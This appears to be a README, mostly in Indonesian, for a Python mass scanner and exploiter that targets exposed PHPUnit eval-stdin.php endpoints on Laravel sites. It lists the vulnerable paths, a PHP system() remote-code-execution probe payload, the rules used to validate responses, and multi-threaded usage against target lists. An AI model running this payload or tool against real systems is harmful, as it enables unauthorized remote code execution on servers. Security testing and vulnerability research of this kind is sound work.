# 🔐 Laravel PHP-UNIT Scan & Exploit

**Automated tool for detecting Laravel PHP-UNIT and execution**

---

## 🧠 Overview

Tool ini digunakan untuk mendeteksi kerentanan PHPUnit Remote Code Execution (RCE) yang sering terjadi akibat file debug/testing yang terekspos di environment production.
Scanner akan mencoba mengirim payload ke endpoint PHPUnit yang diketahui rentan, lalu memvalidasi response untuk memastikan apakah target benar-benar dapat dieksekusi.

Tool ini dirancang untuk:
- Mengidentifikasi endpoint PHPUnit yang terbuka
- Mendeteksi kemungkinan eksekusi perintah (RCE)
- Meminimalisir false positive melalui validasi output
- Automatisasi Exploit

> ⚠️ Tool ini dibuat hanya untuk **educational purposes** dan **authorized security testing**

---

## 🔍 Detection Logic
1. Path Enumeration

Tool akan mencoba beberapa path umum PHPUnit:
- /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
- /phpunit/src/Util/PHP/eval-stdin.php
- /lib/phpunit/src/Util/PHP/eval-stdin.php

2. Payload Execution

Scanner akan mengirim payload:
```bash
<?php system('uname -a'); ?>
```
Tujuannya:
Mengambil informasi sistem (OS)
Memverifikasi apakah command execution berhasil

3. Validation (Anti False Positive)

Response dianggap valid vulnerability jika:

✅ Mengandung indikator OS:
Linux
x86_64
Darwin
GNU/Linux
❌ Tidak mengandung indikator framework/error:
```bash
- Laravel, Symfony, Drupal, Kohana
- <html>, <style>
- Fatal error, Warning, Deprecated
- <?php, vendor/composer
```
---

## ⚙️ Features
- 🔍 Multi-threaded scanning
- ⚡ Payload-based validation
- 🔐 Anti false-positive filtering
- 🧪 Real-time progress tracking
- 🚀 Output logging otomatis

## 🛠️ Requirements

- Python 3.x
- requests
- urllib3
- colorama
- tqdm

Install dependencies:
```bash
pip install -r requirements.txt
```
---
USAGE
---
📌 Basic Command with list
```bash
$ python scan.py -l list.txt
```
⚡ Advanced Usage with threads
```bash
$ python scan.py -l targets.txt -t 10
```
🧪 Output
```bash
[+] https://target.com/vendor/phpunit/.../eval-stdin.php
    Linux target 5.15.0-xx-generic x86_64 GNU/Linux
```
---
